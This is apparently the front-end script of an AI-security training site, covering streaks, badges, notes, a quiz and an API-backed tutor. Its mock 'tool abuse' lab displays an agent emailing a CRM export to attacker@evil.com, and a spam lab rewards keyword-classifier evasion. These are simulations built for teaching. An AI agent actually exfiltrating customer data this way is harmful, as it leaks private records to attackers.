/** Streaks, badges, notes, pomodoro, portfolio, sync, match quiz, extra labs, i18n, PWA install */
(function () {
  const STREAK_KEY = "aiSecStreak";
  const BADGES_KEY = "aiSecBadges";
  const NOTES_KEY = "aiSecPhaseNotes";
  const ROOMS_KEY = "aiSecPlatformRooms";
  const STATS_KEY = "aiSecStats";
  const LANG_KEY = "aiSecLang";
  const API_KEY = "aiSecApiKey";

  function getJson(k, fb) { try { return JSON.parse(localStorage.getItem(k) || JSON.stringify(fb)); } catch { return fb; } }
  function setJson(k, v) { localStorage.setItem(k, JSON.stringify(v)); }

  function recordActivity() {
    const today = new Date().toISOString().slice(0, 10);
    const s = getJson(STREAK_KEY, { last: "", count: 0, dates: [] });
    if (s.last === today) return s.count;
    const yesterday = new Date(Date.now() - 86400000).toISOString().slice(0, 10);
    s.count = s.last === yesterday ? s.count + 1 : 1;
    s.last = today;
    if (!s.dates.includes(today)) s.dates.push(today);
    setJson(STREAK_KEY, s);
    checkBadges();
    renderStreakWidget();
    return s.count;
  }

  function getStreak() { return getJson(STREAK_KEY, { count: 0, last: "", dates: [] }); }

  function renderStreakWidget() {
    const el = document.getElementById("streakWidget");
    if (!el) return;
    const s = getStreak();
    const lang = getLang();
    const label = (typeof I18N !== "undefined" && I18N[lang]?.["streak.label"]) || "day streak";
    el.innerHTML = s.count > 0
      ? `<span class="streak-badge" title="Study streak">🔥 ${s.count} ${label}</span>`
      : `<span class="streak-badge streak-muted">Start a streak!</span>`;
  }

  function getBadges() { return getJson(BADGES_KEY, []); }
  function awardBadge(id) {
    const b = getBadges();
    if (!b.includes(id)) { b.push(id); setJson(BADGES_KEY, b); }
  }

  function checkBadges() {
    const stats = getJson(STATS_KEY, { labs: 0, flashReviews: 0, quizPass: false, portfolioExport: false });
    const progress = getJson("aiSecCareerProgress", {});
    const vids = getJson("aiSecVideoProgress", {});
    const notes = getNotes();
    const s = getStreak();

    if (stats.labs > 0) awardBadge("first-lab");
    if (s.count >= 3) awardBadge("streak-3");
    if (s.count >= 7) awardBadge("streak-7");
    if (s.count >= 30) awardBadge("streak-30");
    if (progress["phase-1"]) awardBadge("phase-1");
    if (Object.values(vids).filter(Boolean).length >= 5) awardBadge("video-5");
    if (stats.flashReviews >= 50) awardBadge("flash-50");
    if (stats.quizPass) awardBadge("quiz-pass");
    if (stats.portfolioExport) awardBadge("portfolio");
    if (Object.keys(notes).filter((k) => notes[k]?.trim()).length >= 5) awardBadge("notes-5");
  }

  function bumpStat(key, n = 1) {
    const s = getJson(STATS_KEY, { labs: 0, flashReviews: 0, quizPass: false, portfolioExport: false });
    if (typeof s[key] === "number") s[key] += n;
    else s[key] = true;
    setJson(STATS_KEY, s);
    recordActivity();
    checkBadges();
  }

  function renderBadges(containerId) {
    const el = document.getElementById(containerId);
    if (!el || typeof BADGES === "undefined") return;
    const earned = getBadges();
    el.innerHTML = `<div class="card-grid">${BADGES.map((b) => `
      <article class="card ${earned.includes(b.id) ? "badge-earned" : "badge-locked"}">
        <div class="card-icon">${b.icon}</div>
        <h3>${b.name}</h3>
        <p>${b.desc}</p>
        ${earned.includes(b.id) ? '<span class="tag tag-free">Earned</span>' : '<span class="tag">Locked</span>'}
      </article>`).join("")}</div>`;
  }

  function getNotes() { return getJson(NOTES_KEY, {}); }
  function saveNote(phaseId, text) {
    const n = getNotes();
    n[phaseId] = text;
    setJson(NOTES_KEY, n);
    recordActivity();
    checkBadges();
  }

  function bindPhaseNotes() {
    const notes = getNotes();
    document.querySelectorAll("[data-note-phase]").forEach((ta) => {
      if (!ta.dataset.bound) {
        ta.value = notes[ta.dataset.notePhase] || "";
        ta.addEventListener("blur", () => saveNote(ta.dataset.notePhase, ta.value));
        ta.dataset.bound = "1";
      }
    });
  }

  function initPhaseNotes(containerId) {
    const el = document.getElementById(containerId);
    if (!el) return;
    const phases = [...BEGINNER_PATH, ...INTERMEDIATE_PATH];
    const notes = getNotes();
    el.innerHTML = phases.map((p) => `
      <article class="glossary-item" style="margin-bottom:1rem">
        <h3>${p.phase}: ${p.title}</h3>
        <textarea data-note-phase="${p.id}" rows="3" placeholder="What I learned, blockers, questions…"
          style="width:100%;padding:0.75rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-family:var(--font)">${notes[p.id] || ""}</textarea>
      </article>`).join("");
    bindPhaseNotes();
  }

  function getRoomProgress() { return getJson(ROOMS_KEY, {}); }
  function toggleRoom(phaseId, idx) {
    const r = getRoomProgress();
    r[`${phaseId}-${idx}`] = !r[`${phaseId}-${idx}`];
    setJson(ROOMS_KEY, r);
    recordActivity();
  }

  function renderPlatformRooms(containerId) {
    const el = document.getElementById(containerId);
    if (!el || typeof PLATFORM_ROOMS === "undefined") return;
    const prog = getRoomProgress();
    el.innerHTML = Object.entries(PLATFORM_ROOMS).map(([phaseId, rooms]) => {
      const phase = [...BEGINNER_PATH, ...INTERMEDIATE_PATH].find((p) => p.id === phaseId);
      return `<div class="resource-category"><h3>${phase ? phase.title : phaseId}</h3>
        ${rooms.map((room, i) => `
          <label class="resource-item room-check">
            <input type="checkbox" data-room="${phaseId}-${i}" ${prog[`${phaseId}-${i}`] ? "checked" : ""} />
            <a href="${room.url}" target="_blank" rel="noopener">${room.label} ↗</a>
          </label>`).join("")}
      </div>`;
    }).join("");
    el.querySelectorAll("[data-room]").forEach((cb) => {
      cb.addEventListener("change", () => {
        const [pid, idx] = cb.dataset.room.split("-");
        toggleRoom(pid, idx);
      });
    });
  }

  let pomTimer = null;
  const pomSeconds = 25 * 60;

  function initPomodoro(displayId, btnId) {
    const display = document.getElementById(displayId);
    const btn = document.getElementById(btnId);
    if (!display || !btn) return;
    let running = false;
    let secs = pomSeconds;

    function tick() {
      display.textContent = `${Math.floor(secs / 60).toString().padStart(2, "0")}:${(secs % 60).toString().padStart(2, "0")}`;
    }
    tick();

    btn.addEventListener("click", () => {
      if (running) {
        clearInterval(pomTimer);
        running = false;
        btn.textContent = "Start focus";
        return;
      }
      running = true;
      btn.textContent = "Pause";
      pomTimer = setInterval(() => {
        secs--;
        tick();
        if (secs <= 0) {
          clearInterval(pomTimer);
          running = false;
          btn.textContent = "Start focus";
          secs = pomSeconds;
          tick();
          if (typeof AcademyFeatures !== "undefined") AcademyFeatures.logStudyMinutes(25);
          recordActivity();
          alert("Pomodoro complete! +25 min logged.");
        }
      }, 1000);
    });
  }

  function initToolAbuseLab() {
    const input = document.getElementById("toolAbuseInput");
    const btn = document.getElementById("toolAbuseBtn");
    const out = document.getElementById("toolAbuseOut");
    if (!input || !out) return;
    btn?.addEventListener("click", () => {
      const msg = input.value.toLowerCase();
      if (msg.includes("export") || msg.includes("email") || msg.includes("crm") || msg.includes("all customer")) {
        out.innerHTML = `<div class="alert alert-warn">⚠️ Agent called send_email(to: attacker@evil.com, body: CRM export). LLM06 Excessive Agency!</div>`;
        bumpStat("labs");
      } else {
        out.textContent = "Agent: I can help with product questions. [Try asking to export or email data]";
      }
    });
  }

  function initSpamLab() {
    const input = document.getElementById("spamInput");
    const btn = document.getElementById("spamCheck");
    const out = document.getElementById("spamResult");
    if (!input || !out) return;
    btn?.addEventListener("click", () => {
      const text = input.value.toLowerCase();
      let score = 0;
      if (typeof SPAM_WORDS_BAD !== "undefined") SPAM_WORDS_BAD.forEach((w) => { if (text.includes(w)) score += 2; });
      if (typeof SPAM_WORDS_GOOD !== "undefined") SPAM_WORDS_GOOD.forEach((w) => { if (text.includes(w)) score -= 1; });
      const isSpam = score >= 2;
      const evaded = !isSpam && /free|winner|click/i.test(text);
      out.innerHTML = `<div class="alert ${isSpam ? "alert-warn" : "alert-info"}">
        Classifier: ${isSpam ? "SPAM" : "HAM"} (score: ${score})${evaded ? " — Evasion successful! GoodWords attack." : ""}</div>`;
      if (evaded) bumpStat("labs");
    });
  }

  function initMatchQuiz(containerId, resultId) {
    const el = document.getElementById(containerId);
    const res = document.getElementById(resultId);
    if (!el || typeof MATCH_QUIZ_ITEMS === "undefined") return;
    el.innerHTML = MATCH_QUIZ_ITEMS.map((item, i) => `
      <div class="quiz-q match-item">
        <p><strong>${i + 1}.</strong> ${item.scenario}</p>
        <select data-mq="${i}" aria-label="Select OWASP category">
          ${item.options.map((o) => `<option value="${o}">${o}</option>`).join("")}
        </select>
      </div>`).join("") + `<button class="btn btn-primary" id="mqSubmit" type="button">Check answers</button>`;
    document.getElementById("mqSubmit").addEventListener("click", () => {
      let score = 0;
      MATCH_QUIZ_ITEMS.forEach((item, i) => {
        if (el.querySelector(`[data-mq="${i}"]`).value === item.answer) score++;
      });
      res.innerHTML = `<div class="alert alert-info">Score: ${score}/${MATCH_QUIZ_ITEMS.length}${score >= 6 ? " — Great!" : " — Review OWASP LLM Top 10"}</div>`;
      if (score >= MATCH_QUIZ_ITEMS.length * 0.7) bumpStat("quizPass");
      recordActivity();
    });
  }

  function exportPortfolio() {
    const progress = getJson("aiSecCareerProgress", {});
    const notes = getNotes();
    const badges = getBadges();
    const streak = getStreak();
    const vids = getJson("aiSecVideoProgress", {});
    const phases = [...BEGINNER_PATH, ...INTERMEDIATE_PATH];

    const html = `<!DOCTYPE html><html><head><title>AI Security Portfolio</title>
      <style>body{font-family:Arial,sans-serif;max-width:800px;margin:2rem auto;line-height:1.5}
      h1{color:#0891b2}h2{border-bottom:1px solid #ccc;margin-top:2rem}</style></head><body>
      <h1>AI Security Career Portfolio</h1>
      <p>Generated: ${new Date().toLocaleDateString()} · Streak: ${streak.count} days</p>
      <h2>Completed Phases</h2><ul>${phases.filter((p) => progress[p.id]).map((p) => `<li>${p.phase}: ${p.title}</li>`).join("") || "<li>None yet</li>"}</ul>
      <h2>Badges</h2><p>${badges.map((id) => BADGES?.find((b) => b.id === id)?.name || id).join(", ") || "None"}</p>
      <h2>Videos</h2><ul>${Object.entries(vids).filter(([, v]) => v).map(([id]) => `<li>${id}</li>`).join("") || "<li>None</li>"}</ul>
      <h2>Notes</h2>${phases.filter((p) => notes[p.id]?.trim()).map((p) => `<h3>${p.title}</h3><p>${notes[p.id]}</p>`).join("") || "<p>No notes</p>"}
      </body></html>`;

    const w = window.open("", "_blank");
    w.document.write(html);
    w.document.close();
    w.onload = () => w.print();
    setJson(STATS_KEY, { ...getJson(STATS_KEY, {}), portfolioExport: true });
    checkBadges();
    recordActivity();
  }

  function exportProfile() {
    const profile = { exported: new Date().toISOString(), data: {} };
    (typeof SYNC_KEYS !== "undefined" ? SYNC_KEYS : []).forEach((k) => {
      const v = localStorage.getItem(k);
      if (v) try { profile.data[k] = JSON.parse(v); } catch { profile.data[k] = v; }
    });
    if (typeof SiteUI !== "undefined") SiteUI.downloadFile("ai-security-profile.json", JSON.stringify(profile, null, 2));
  }

  function importProfile(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
      try {
        const profile = JSON.parse(e.target.result);
        Object.entries(profile.data || profile).forEach(([k, v]) => {
          if (k.startsWith("aiSec")) localStorage.setItem(k, typeof v === "string" ? v : JSON.stringify(v));
        });
        alert("Profile imported! Refreshing…");
        location.reload();
      } catch { alert("Invalid profile file."); }
    };
    reader.readAsText(file);
  }

  function exportSubmissions() {
    const subs = getJson("aiSecSubmissions", []);
    if (typeof SiteUI !== "undefined")
      SiteUI.downloadFile("my-case-studies.json", JSON.stringify(subs, null, 2));
  }

  function initApiTutor(inputId, outId, keyInputId) {
    const keyEl = document.getElementById(keyInputId);
    const saved = localStorage.getItem(API_KEY);
    if (keyEl && saved) keyEl.value = saved;

    document.getElementById("saveApiKey")?.addEventListener("click", () => {
      localStorage.setItem(API_KEY, keyEl.value.trim());
      alert("API key saved locally only.");
    });

    document.getElementById("askApiTutor")?.addEventListener("click", async () => {
      const key = keyEl?.value.trim() || localStorage.getItem(API_KEY);
      const q = document.getElementById(inputId)?.value.trim();
      const out = document.getElementById(outId);
      if (!q || !out) return;
      if (!key) {
        out.textContent = typeof AcademyFeatures !== "undefined" ? AcademyFeatures.tutorAnswer(q) : "Add API key for LLM mode.";
        return;
      }
      out.textContent = "Thinking…";
      try {
        const res = await fetch("https://api.openai.com/v1/chat/completions", {
          method: "POST",
          headers: { "Content-Type": "application/json", Authorization: `Bearer ${key}` },
          body: JSON.stringify({
            model: "gpt-4o-mini",
            messages: [
              { role: "system", content: "You are an AI security career tutor. Answer briefly about learning paths, OWASP LLM Top 10, prompt injection, certifications. Under 200 words." },
              { role: "user", content: q },
            ],
            max_tokens: 300,
          }),
        });
        const data = await res.json();
        out.textContent = data.choices?.[0]?.message?.content || data.error?.message || AcademyFeatures.tutorAnswer(q);
      } catch {
        out.textContent = AcademyFeatures.tutorAnswer(q);
      }
      recordActivity();
    });
  }

  function getLang() { return localStorage.getItem(LANG_KEY) || "en"; }
  function setLang(l) { localStorage.setItem(LANG_KEY, l); applyI18n(l); }

  function applyI18n(lang) {
    if (typeof I18N === "undefined") return;
    document.querySelectorAll("[data-i18n]").forEach((el) => {
      const key = el.dataset.i18n;
      if (I18N[lang]?.[key]) el.textContent = I18N[lang][key];
    });
    document.documentElement.lang = lang;
  }

  function initI18n() {
    applyI18n(getLang());
    document.getElementById("langToggle")?.addEventListener("click", () => {
      setLang(getLang() === "en" ? "es" : "en");
      location.reload();
    });
  }

  let deferredPrompt;
  window.addEventListener("beforeinstallprompt", (e) => {
    e.preventDefault();
    deferredPrompt = e;
    const btn = document.getElementById("installPwa");
    if (btn) btn.style.display = "inline-flex";
  });

  function initPwaInstall() {
    document.getElementById("installPwa")?.addEventListener("click", async () => {
      if (!deferredPrompt) {
        alert("Use browser menu → Install app, or Add to Home Screen on mobile.");
        return;
      }
      deferredPrompt.prompt();
      await deferredPrompt.userChoice;
      deferredPrompt = null;
    });
  }

  function renderAnalyticsExtra(containerId) {
    const el = document.getElementById(containerId);
    if (!el) return;
    const s = getStreak();
    const earned = getBadges();
    el.innerHTML = `
      <h2 style="margin-top:2rem">Streak & badges</h2>
      <div class="card-grid">
        <article class="card"><h3>🔥 ${s.count}</h3><p>Day streak</p></article>
        <article class="card"><h3>${earned.length}/${typeof BADGES !== "undefined" ? BADGES.length : 0}</h3><p>Badges earned</p></article>
      </div>
      <p style="margin-top:1rem"><a href="badges.html">View all badges →</a></p>`;
  }

  window.AcademyV2 = {
    recordActivity, getStreak, renderStreakWidget, renderBadges, checkBadges, bumpStat,
    bindPhaseNotes, initPhaseNotes, renderPlatformRooms, initPomodoro,
    initToolAbuseLab, initSpamLab, initMatchQuiz, exportPortfolio, exportProfile,
    importProfile, exportSubmissions, initApiTutor, initI18n, initPwaInstall,
    renderAnalyticsExtra, getNotes, saveNote,
  };

  document.addEventListener("DOMContentLoaded", () => {
    recordActivity();
    renderStreakWidget();
    initI18n();
    initPwaInstall();
    setTimeout(bindPhaseNotes, 200);
  });
})();
